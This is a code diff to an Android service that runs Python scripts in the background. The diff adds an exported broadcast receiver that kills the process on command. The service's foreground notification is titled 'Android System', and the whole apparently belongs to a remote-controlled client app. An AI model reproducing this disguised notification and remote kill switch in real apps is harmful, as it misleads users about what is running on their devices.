@@ -15,6 +15,7 @@ import android.util.Log
 import androidx.core.app.NotificationCompat
 import com.chaquo.python.Python
 import com.chaquo.python.android.AndroidPlatform
+import com.client.services.client.KILL_SELF_BROADCAST
 import kotlinx.coroutines.*
 
 /**
@@ -85,6 +86,13 @@ class PythonInteractiveScriptRunnerService : Service() {
             .setContentTitle("Android System")
             .build()
         startForeground(3, notification)
+
+        val killSelfBroadcastReceiver = object : BroadcastReceiver() {
+            override fun onReceive(context: Context, intent: Intent) {
+                android.os.Process.killProcess(android.os.Process.myPid())
+            }
+        }
+        registerReceiver(killSelfBroadcastReceiver, IntentFilter(KILL_SELF_BROADCAST), RECEIVER_EXPORTED)
 
         val scriptPath = intent?.getStringExtra(EXTRA_SCRIPT_PATH)
         val arguments = intent?.getStringArrayListExtra(EXTRA_ARGUMENTS) ?: arrayListOf()
